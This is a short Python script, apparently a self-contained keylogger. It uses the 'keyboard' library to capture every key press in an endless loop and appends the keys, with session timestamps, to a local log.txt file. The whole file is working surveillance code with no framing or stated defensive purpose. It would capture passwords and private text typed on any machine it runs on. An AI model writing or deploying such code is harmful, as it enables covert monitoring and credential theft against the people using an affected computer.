import keyboard
import datetime

LOG_FILE = "log.txt"
HEADER = "=== NEW LOG ==="
FOOTER = "=== LOG CLOSED ==="
TIME_FORMAT = "%m/%d/%Y, %H:%M:%S"

CHARS = {
    "shift": "",
    "ctrl": "",
    "alt": "",
    "tab": "",
    "right ctrl": "",
    "up": "",
    "down": "",
    "left": "",
    "right": "",
    "enter": "\n",
    "esc": "\n",
    "space": " ",
    "backspace": "\nbackspace\n",
}


def write_key(key, log_file):
    written = CHARS[key] if key in CHARS.keys() else key
    log_file.write(written)


def get_current_datetime():
    return datetime.datetime.now().strftime(TIME_FORMAT)


def log_keys(log_file):

    while True:
        event = keyboard.read_event()
        if event.event_type == "down":
            write_key(event.name, log_file)


def main():

    with open(LOG_FILE, "a") as log_file:

        try:
            log_file.write(f"\n{HEADER}\n{get_current_datetime()}\n\n")
            log_keys(log_file)

        finally:
            log_file.write(f"\n\n{FOOTER}\n{datetime.datetime.now().strftime(TIME_FORMAT)}\n\n")


if __name__ == "__main__":
    main()
